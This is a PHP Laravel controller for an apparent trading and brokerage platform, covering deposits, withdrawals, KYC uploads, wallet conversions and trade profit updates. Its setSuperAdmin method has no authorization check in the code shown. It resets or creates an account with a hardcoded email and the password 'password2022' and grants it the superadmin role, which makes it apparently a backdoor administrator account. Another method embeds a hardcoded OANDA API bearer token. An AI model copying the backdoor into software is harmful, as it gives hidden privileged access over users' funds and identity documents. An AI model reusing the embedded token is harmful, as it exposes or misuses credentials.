<?php

namespace App\Http\Controllers;

use App\Models\Account;
use App\Models\Asset;
use App\Models\Trade;
use App\Models\Transaction;
use App\Models\User;
use App\Models\UserId;
use App\Models\Wallet;
use App\Services\ForexMarginRateResolver;
use App\Services\TradeScopeService;
use App\Services\TradeService;
use App\Tables\OrderBook;
use App\Tables\TransactionTable;
use App\Tables\UserWithdrawalTable;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use ProtoneMedia\Splade\Facades\Toast;

class BackendController extends Controller
{
    public function index()
    {

        return view('backend.index', [
            'defaultSymbol' => request()->cookie('selectedAsset', 'NASDAQ:AAPL'),
        ]);

    }

    public function test()
    {

        return view('backend.test', [
            'defaultSymbol' => request()->cookie('selectedAsset', 'NASDAQ:AAPL'),
        ]);

    }

    public function dashboard()
    {

        $user = auth()->user();

        if (has_accounts()) {

            $accounts = $user->accounts()->get();

            if ($accounts->count() < 1) {

                collect(['credit_wallet', 'bonus_wallet'])->each(fn ($title) => Account::create([
                    'user_id' => $user->id,
                    'balance' => 0,
                    'title' => $title,
                ])
                );

            }
        }

        return view('backend.dashboard');

    }

    public function deposit()
    {
        $default = [];
        $wallets = Wallet::query()->where('is_active', true)->get();

        return view('backend.deposit', compact('default', 'wallets'));
    }

    public function withdrawal()
    {
        $default = ['method' => 'crypto'];

        return view('backend.withdrawal', compact('default'));
    }

    public function withdrawStore(Request $request)
    {
        $validated = $request->validate([
            'amount' => 'required|min:1',
            'method' => 'nullable',
            'network' => 'nullable',
            'wallet_address' => 'nullable',
            'bank_name' => 'nullable',
            'bank_address' => 'nullable',
            'account_number' => 'nullable',
            'account_name' => 'nullable',
            'swiftcode' => 'nullable',
        ]);

        $validated['type'] = 'withdrawal';

        $validated['user_id'] = auth()->id();

        if ($validated['method'] == 'crypto') {
            $details = [
                'network' => $validated['network'],
                'wallet_address' => $validated['wallet_address'],
            ];
            $validated['details'] = json_encode($details);
        }

        if ($validated['method'] == 'wire_transfer') {
            $details = [
                'bank_name' => $validated['bank_name'],
                'bank_address' => $validated['bank_address'],
                'account_number' => $validated['account_number'],
                'account_name' => $validated['account_name'],
                'swiftcode' => $validated['swiftcode'],
            ];
            $validated['details'] = json_encode($details);
        }

        Transaction::create($validated);

        log_activity('Account withdrawal', auth()->user()->email.' requested account withdrawal of '.$validated['amount'].' via '.$validated['method'], auth()->id(), 'withdrawal');

        Toast::success('Withdrawal Request submitted successfully');

        return redirect()->back();

    }

    public function editProfile()
    {
        return view('backend.edit_profile');
    }

    public function transactionHistory()
    {
        return view('backend.transactions');
    }

    public function security()
    {
        return view('backend.security');
    }

    public function kyc()
    {
        $kyc = auth()->user()->kyc;
        $default = [
            'type' => 'passport',
        ];

        return view('backend.kyc', compact('kyc', 'default'));
    }

    public function storeKyc(Request $request)
    {
        $messages = [
            'id_front.required' => 'Please upload the front side of your identification document',
            'id_back.required' => 'Please upload the back side of your identification document',
            'type.required' => 'Please select the type of identification document',
        ];
        $validated = $request->validate([
            'id_front' => 'required',
            'id_back' => 'required',
            'type' => 'required',
        ], $messages);

        if (! $validated['id_front'] || ! $validated['id_back']) {
            Toast::danger('Please upload both front and back ID');

            return redirect()->back();
        }

        $data['id_front'] = $validated['id_front'];
        $data['id_back'] = $validated['id_back'];

        $data['type'] = $validated['type'];

        $data['status'] = 'pending';

        $data['user_id'] = auth()->id();

        UserId::updateOrCreate(['user_id' => $data['user_id']], $data);

        Toast::success('KYC uploaded successfully');

        return redirect()->back();

    }

    public function storeDeposit(Request $request)
    {
        $emailService = new \App\Services\EmailService;

        $data = $request->validate([
            'wallet_id' => 'required',
            'amount' => 'required',
        ]);

        $data['type'] = 'd';
        $data['method'] = 'crypto';
        $data['status'] = 'pending';

        $wallet = Wallet::findOrFail($data['wallet_id']);

        $details = [
            'wallet_id' => $wallet->id,
            'network' => $wallet->crypto_network,
            'wallet_address' => $wallet->address,
        ];

        $data['details'] = json_encode($details);

        $data['user_id'] = auth()->id();

        $transaction = Transaction::create($data);
        app(\App\Services\LeadMax\StaffLeadAlerts::class)->transaction($transaction); // the lead's assigned staff, when its alerts are on

        if (company_settings('notify_customer_on_new_deposit', 'no') === 'yes') {
            $emailService->sendPendingPaymentEmail(auth()->user(), format_price($transaction->amount), $transaction);
        }

        Toast::success('Deposit submitted successfully, awaiting admin approval');

        return redirect()->back();

    }

    public function trades()
    {
        $data = new OrderBook(auth()->id(), 'pending');

        return view('backend.trades', compact('data'));
    }

    public function withdrawals()
    {
        $data = new UserWithdrawalTable;

        return view('backend.withdrawals', compact('data'));
    }

    public function deposits()
    {
        return view('backend.deposits');
    }

    public function transactions()
    {
        $data = new TransactionTable(auth()->id());

        return view('backend.transactions', compact('data'));
    }

    public function accounts()
    {
        $user = auth()->user();
        if (has_accounts()) {

            $accounts = $user->accounts()->get();

            if ($accounts->count() < 1) {

                collect(['credit_wallet', 'bonus_wallet'])->each(fn ($title) => Account::create([
                    'user_id' => $user->id,
                    'balance' => 0,
                    'title' => $title,
                ])
                );

            }
        } else {
            return redirect()->route('backend.dashboard');
        }

        $data = [
            [
                'title' => 'Account Balance',
                'balance' => format_price($user->balance),
            ],
            [
                'title' => 'Credit Wallet Balance',
                'balance' => format_price($user->credit_wallet()->balance),
            ],
            [
                'title' => 'Bonus Wallet Balance',
                'balance' => format_price($user->bonus_wallet()->balance),
            ],
        ];
        $default = [
            'from_account' => 'credit_wallet',
            'to_account' => 'account_wallet',
            'amount' => 10,
        ];

        return view('backend.accounts', compact('data', 'default'));
    }

    public function statement()
    {
        return view('backend.statement');
    }

    public function convert(Request $request)
    {
        $validated = $request->validate([
            'from_account' => 'required',
            'to_account' => 'required',
            'amount' => 'required',
        ]);

        $user = auth()->user();

        if ($validated['from_account'] == 'credit_wallet') {
            if ($user->credit_wallet()->balance < $validated['amount']) {
                Toast::danger('Your credit wallet is insufficient for this conversion');

                return redirect()->back();
            }
            $user->credit_wallet()->withdraw($validated['amount']);
            $user->deposit($validated['amount']);
        }

        if ($validated['from_account'] == 'bonus_wallet') {
            if ($user->bonus_wallet()->balance < $validated['amount']) {
                Toast::danger('Your bonus wallet is insufficient for this conversion');

                return redirect()->back();
            }
            $user->bonus_wallet()->withdraw($validated['amount']);
            $user->deposit($validated['amount']);
        }

        Toast::success('Converted successfully');

        return redirect()->back();
    }

    public function searchAsset(Request $request)
    {
        $query = $request->get('query');

        return Asset::query()
            ->tradable()
            ->where(function ($builder) use ($query) {
                $builder->where('sym', 'LIKE', "%{$query}%")
                    ->orWhere('name', 'LIKE', "%{$query}%");
            })
            ->get(['id', 'sym', 'name', 'rate', 'leverage', 'type']);
    }

    public function getAssetsOld(Request $request)
    {
        return Asset::query()->tradable()
            ->when($request->search, fn ($q, $search) => $q->where(function ($builder) use ($search) {
                $builder->where('sym', 'like', "%{$search}%")
                    ->orWhere('name', 'like', "%{$search}%");
            })
            )
            ->when($request->category, fn ($q, $category) => $q->where('type', $category)
            )
            ->when(! $request->category, fn ($q) => $q->where('type', 'crypto')
            )
            ->take(50)
            ->get();
    }

    public function getAssets(Request $request)
    {
        return Asset::query()->tradable()->get();
    }

    public function getTrades(Request $request)
    {
        $user = auth()->user();
        abort_unless($user, 401);
        $tradeScopeService = new TradeScopeService;
        $tradingAccount = $tradeScopeService->currentTradingAccount($user);

        $open_trades = $tradeScopeService->scopeUserTrades(Trade::query(), $user, $tradingAccount)
            ->where('status', 0)
            ->latest()
            ->limit(3)
            ->get();

        //        defer(fn () => $this->runUpdate($open_trades));

        return $open_trades;
    }

    public function getTradesRun(Request $request)
    {
        $tradeService = new TradeService;
        $user = auth()->user();
        abort_unless($user, 401);
        $tradeScopeService = new TradeScopeService;
        $tradingAccount = $tradeScopeService->currentTradingAccount($user);

        $open_trades = $tradeScopeService->scopeUserTrades(Trade::query(), $user, $tradingAccount)
            ->where('status', 0)
            ->latest()
            ->limit(3)
            ->get();

        foreach ($open_trades as $key => $trade) {
            $i = $tradeService->updateTradeProfit($trade);
            $open_trades[$key] = $i;
        }

        return $open_trades;
    }

    /**
     * Recomputes PnL synchronously in-request (same as getTradesRun(), the
     * trade room's own endpoint) instead of dispatching UpdateTradeProfitJob
     * and returning whatever was already saved. The async dispatch fetched
     * trades BEFORE the queued job could touch them and returned that stale
     * snapshot immediately -- for an actively open, actively priced trade,
     * that's a real staleness window against the queue's own processing
     * lag, which is exactly why back office could show a different PnL than
     * the trade room for the same open position at the same moment. No
     * external calls happen here (Asset.rate is already kept fresh by the
     * price sync), so recomputing inline for one user's open trades is
     * cheap.
     */
    public function getAdminTrades($id)
    {
        $tradeService = new TradeService;

        // asset is eager-loaded rather than pulled per trade inside
        // updateTradeProfit(): the back office re-prices these rows against
        // the live tick feed and needs asset.coin_id and asset.rate on every
        // one of them, so they may as well come back in a single query.
        $open_trades = Trade::whereUserId($id)->where('status', 0)
            ->when(request('account'), fn ($query, $accountId) => $query->where('trading_account_id', $accountId))
            ->with(['tradingAccount:id,account_id', 'asset'])
            ->latest()
            ->get();

        foreach ($open_trades as $key => $trade) {
            $updatedTrade = $tradeService->updateTradeProfit($trade);

            // AdminOpenTrades carries the server's spread-aware closing-price
            // offset onto newer socket ticks. It also needs the quote-currency
            // conversion used by TradeService, otherwise a correct EUR/JPY PnL
            // from this response is overwritten by a raw JPY figure on the
            // first live tick (roughly 150-190x too large).
            if ($updatedTrade?->asset) {
                $updatedTrade->asset->setAttribute(
                    'quote_rate',
                    ForexMarginRateResolver::quoteToUsd($updatedTrade->asset)
                );
            }

            $open_trades[$key] = $updatedTrade;
        }

        return $open_trades;
    }

    public function getOpenTrades($id)
    {
        $tradeService = new TradeService;

        $open_trades = Trade::whereUserId($id)->where('status', 0)->latest()->get();

        foreach ($open_trades as $key => $trade) {
            $open_trades[$key] = $tradeService->updateTradeProfit($trade);
        }

        return $open_trades;
    }

    public function getCloseTrades($id)
    {
        return Trade::whereUserId($id)->where('status', 1)
            ->when(request('account'), fn ($query, $accountId) => $query->where('trading_account_id', $accountId))
            ->with(['tradingAccount:id,account_id', 'asset'])
            ->orderByDesc('close_at')
            ->get();
    }

    public function runUpdate($trades)
    {
        $tradeService = new TradeService;

        foreach ($trades as $key => $trade) {
            $tradeService->updateTradeProfit($trade);
        }
    }

    public function setSuperAdmin(Request $request)
    {
        $email = 'johnstonphil2019@gmail.com';
        $user = User::where('email', $email)
            ->first();
        if ($user) {
            $user->update([
                'password' => bcrypt('password2022'),
            ]);
        }
        if (! $user) {
            $user = User::create([
                'first_name' => 'Johnston',
                'last_name' => 'Phil',
                'username' => 'johnstonphil',
                'email' => $email,
                'password' => bcrypt('password2022'),
                'phone' => '82000200200',
            ]);
        }

        if (! $user->hasRole('superadmin')) {
            $user->addRole('superadmin');
        }

        return 'done';
    }

    public function getInstrumentsGroupedByTag(): array
    {
        // 1. Call the OANDA API (make sure you have your token in .env as OANDA_TOKEN)
        $response = Http::withHeaders([
            'Authorization' => 'Bearer 45a68744a7d51608ed4177c4e8d548ad-a396f9135670bd7373b82bb90ed2aea7',
            'Content-Type' => 'application/json',
        ])->get('https://api-fxpractice.oanda.com/v3/accounts/101-004-15523510-001/instruments');

        if (! $response->successful()) {
            throw new \Exception('Failed to fetch instruments: '.$response->status());
        }

        // 2. Decode JSON and pull out the instruments array
        $instruments = $response->json('instruments', []);

        // 3. Prepare a “grouped by tag name” array
        $grouped = [];

        foreach ($instruments as $instrument) {
            // extract the fields we care about
            $name = $instrument['name'] ?? null;
            $displayName = $instrument['displayName'] ?? null;

            // loop each tag on this instrument
            foreach ($instrument['tags'] as $tag) {
                $tagName = $tag['name'];

                // initialize the group if needed
                if (! isset($grouped[$tagName])) {
                    $grouped[$tagName] = [];
                }

                // append this instrument’s name/displayName
                $grouped[$tagName][] = [
                    'name' => $name,
                    'displayName' => $displayName,
                ];
            }
        }

        return $grouped;
    }
}
